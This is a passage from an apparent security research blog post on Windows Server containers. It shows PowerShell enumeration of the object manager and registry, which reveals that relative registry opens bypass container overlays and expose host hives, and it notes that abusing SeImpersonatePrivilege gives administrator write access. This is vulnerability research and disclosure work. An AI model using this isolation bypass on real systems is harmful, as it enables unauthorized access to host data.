 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;NextI used the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;NtObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;drive provider to list the object manager namespace. For example checking the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;Device &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;directory shows what device objects are available.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.67f90f317c479b2d7a29f007b5b1cf274293b216&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.4&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;NtObject:\Device&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;TypeName&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;--------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Ip &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Tcp6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Http &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Directory&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Ip6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;ahcache &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;WMIDataDevice &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;LanmanDatagramReceiver &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Tcp &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;LanmanRedirector &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;DxgKrnl &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;ConDrv &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Null &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;MailslotRedirector &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NamedPipe &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Device&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Udp6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;VhdHardDisk{5ac9b14d-61f3-4b41-9bbf-a2f5b2d6f182} SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;KsecDD &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;DeviceApi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;MountPointManager &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Device&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Interestingly most of the device drivers are symbolic links (almost certainly global) instead of being actual device objects. But there are a few real device objects available. &lt;/span&gt;&lt;span&gt;Even the VHD disk volume is a symbolic link to a device outside the container. &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;There&amp;rsquo;s likely to be some things lurking in accessible devices which could be exploited, but I was still in reconnaissance mode.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;What about the registry? The container should be providing its own Registry hives and so there shouldn&amp;rsquo;t be anything accessible outside of that. After a few tests I noticed something very odd.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.a5bb25cba1c2e2fc97845b1abf603505733ebfe9&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.5&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;HKLM:\SOFTWARE&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Classes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Clients&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\DefaultUserEnvironment&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\ODBC&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\OpenSSH&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Policies&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\RegisteredApplications&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Setup&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;NtObject:\REGISTRY\MACHINE\SOFTWARE&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Classes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Clients&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;DefaultUserEnvironment&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Docker Inc.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Intel&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Macromedia&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Microsoft&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;ODBC&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;OEM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;OpenSSH&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Partner&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Policies&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;RegisteredApplications&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Windows&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;WOW6432Node&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The first command is querying the local machine SOFTWARE hive using the built-in &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_registry_provider&quot;&gt;Registry drive provider&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. The second command is using my module&amp;rsquo;s object manager provider to list the same hive. If you look closely the list of keys is different between the two commands. Maybe I made a mistake somehow? I checked some other keys, for example the user hive attachment point:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.bc8a717c6e3924237eb228e12d843d904386b96c&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.6&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;NtObject:\REGISTRY\USER&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;.DEFAULT&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;S-1-5-19&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;S-1-5-20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;S-1-5-21-426062036-3400565534-2975477557-1001&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;S-1-5-21-426062036-3400565534-2975477557-1001_Classes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;S-1-5-21-426062036-3400565534-2975477557-1003&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;S-1-5-18&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Get-NtSid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Sid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ---&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;User Manager\ContainerUser S-1-5-93-2-2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;No, it still looked wrong. The ContainerUser&amp;rsquo;s SID is &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;S-1-5-93-2-2&lt;/span&gt;&lt;span&gt;, you&amp;rsquo;d expect to see a loaded hive for that user SID. However you don&amp;rsquo;t see one, instead you see &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;S-1-5-21-426062036-3400565534-2975477557-1001&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;which is the SID of the user outside the container. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Something funny was going on. However, this behavior is something I&amp;rsquo;ve seen before. Back in 2016 I reported &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=870&quot;&gt;a bug&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with application hives where you couldn&amp;rsquo;t open the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;\REGISTRY\A&lt;/span&gt;&lt;span&gt;&amp;nbsp;attachment point directly, but you could if you opened &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;\REGISTRY&lt;/span&gt;&lt;span&gt;&amp;nbsp;then did a relative open to &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;A&lt;/span&gt;&lt;span&gt;. It turns out that by luck my registry enumeration code in the module&amp;rsquo;s drive provider uses relative opens using the native system calls, whereas the PowerShell built-in uses absolute opens through the Win32 APIs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Therefore, this was a manifestation of a similar bug: doing a relative open was ignoring the registry overlays and giving access to the real hive.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;This grants a non-administrator user access to any registry key on the host, as long as &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser &lt;/span&gt;&lt;span&gt;can pass the &lt;/span&gt;&lt;span&gt;key&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;access check. You could imagine the host storing some important data in the registry which the container can now read out, however using this to escape the container would be hard. That said, all you need to do is abuse &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;to get administrator access and you can immediately start modifying the host&amp;rsquo;s registry hives. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The fact that I had two bugs in less than a day was somewhat concerning, however at least that knowledge can be applied to any mitigation strategy. I thought I should dig a bit deeper into the kernel to see what else I could exploit from a normal user.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.3935jewic6yi&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;A Little Bit of Reverse Engineering&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;While just doing basic inspection has been surprisingly fruitful it was likely to need some reverse engineering to shake out anything else. I know from previous experience on Desktop Bridge how the registry overlays and object manager redirection works when combined with silos. In the case of Desktop Bridge it uses application silos rather than server silos but they go through similar approaches.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;The main enforcement mechanism used by the kernel to provide the container&amp;rsquo;s isolation is by calling a function to check whether the process is in a silo and doing something different based on the result. I decided to try and track down where the silo state was checked and see if I could find any misuse. You&amp;rsquo;d think the kernel would only have a few functions which would return the current silo state. Unfortunately you&amp;rsquo;d be wrong, the following is a short list of the functions I checked:&lt;/span&gt;&lt;/p&gt;
